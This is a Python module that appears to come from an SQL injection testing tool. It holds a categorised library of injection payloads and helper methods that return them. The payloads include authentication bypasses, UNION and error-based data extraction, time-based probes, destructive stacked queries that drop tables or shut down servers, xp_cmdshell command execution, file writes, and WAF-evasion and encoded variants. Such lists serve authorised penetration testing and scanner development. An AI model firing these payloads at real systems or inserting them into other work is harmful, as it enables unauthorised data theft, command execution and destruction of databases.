"""
Payload Module - Comprehensive SQL Injection Payloads
"""

class SQLIPayloads:
    """Comprehensive SQL injection payload library"""
    
    def __init__(self):
        self.payloads = {
            'basic': [
                "'",
                "''",
                "'--",
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR '1'='1'/*",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "') OR ('1'='1",
                "') OR ('1'='1'--",
                "1' OR '1' = '1",
            ],
            
            'union': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
            ],
            
            'boolean': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "' AND SLEEP(5)--",
                "' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--",
                "' AND 1=(SELECT 1 FROM DUAL WHERE 1=2)--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--",
            ],
            
            'time_based': [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('A'))--",
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5('A'))--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1'; SELECT pg_sleep(5)--",
                "' OR SLEEP(5)--",
            ],
            
            'error_based': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CAST((SELECT @@version) AS int)--",
                "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
                "' AND 1=CONVERT(int,(SELECT user_name()))--",
                "' AND 1=CAST((SELECT DB_NAME()) AS int)--",
            ],
            
            'stacked': [
                "'; DROP TABLE users--",
                "'; EXEC sp_msforeachtable 'DROP TABLE ?'--",
                "'; SHUTDOWN--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; SELECT * INTO OUTFILE '/tmp/test.txt'--",
                "1'; DROP TABLE users--",
                "1'; SHUTDOWN--",
            ],
            
            'mysql': [
                "' AND 1=1#",
                "' AND 1=2#",
                "' UNION SELECT NULL,NULL#",
                "' AND SLEEP(5)#",
                "' AND BENCHMARK(5000000,MD5('A'))#",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e)x FROM information_schema.tables GROUP BY x)a)#",
            ],
            
            'mssql': [
                "' AND 1=1--",
                "' AND 1=2--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND 1=CONVERT(int,@@version)--",
                "'; EXEC xp_cmdshell('whoami')--",
                "' UNION SELECT NULL,NULL FROM sysobjects--",
            ],
            
            'postgresql': [
                "' AND 1=1--",
                "' AND 1=2--",
                "'; SELECT pg_sleep(5)--",
                "' AND 1::int=1--",
                "' UNION SELECT NULL,NULL--",
                "' AND 1=CAST(version() AS int)--",
            ],
            
            'oracle': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' UNION SELECT NULL,NULL FROM DUAL--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ],
            
            'waf_bypass': [
                "1'/**/OR/**/1=1--",
                "1'/*!50000OR*/1=1--",
                "1'%09OR%091=1--",
                "1'%0aOR%0a1=1--",
                "1'%0dOR%0d1=1--",
                "1'%0cOR%0c1=1--",
                "1'%0bOR%0b1=1--",
                "1'||'1'='1",
                "1'OROROR'1'='1",
                "1' UnIoN SeLeCt NULL--",
                "1' /*!UNION*/ /*!SELECT*/ NULL--",
                "1'/**/UNION/**/SELECT/**/NULL--",
                "1' %55nion %53elect NULL--",
                "1' /*!12345UNION*/ SELECT NULL--",
            ],
            
            'encoded': [
                "%27%20OR%201=1--",
                "%27%20OR%20%271%27=%271",
                "%27%20UNION%20SELECT%20NULL--",
                "%2527%20OR%201=1--",
                "%2527%2520OR%25201=1--",
            ]
        }
    
    def get_basic_payloads(self) -> list:
        """Get basic payloads for fast testing"""
        return self.payloads['basic'] + self.payloads['union'][:3]
    
    def get_all_payloads(self) -> list:
        """Get all payloads for comprehensive testing"""
        all_payloads = []
        for category in self.payloads.values():
            all_payloads.extend(category)
        return all_payloads
    
    def get_payloads_by_category(self, category: str) -> list:
        """Get payloads by specific category"""
        return self.payloads.get(category, [])
    
    def get_payload_count(self) -> int:
        """Get total payload count"""
        return sum(len(p) for p in self.payloads.values())
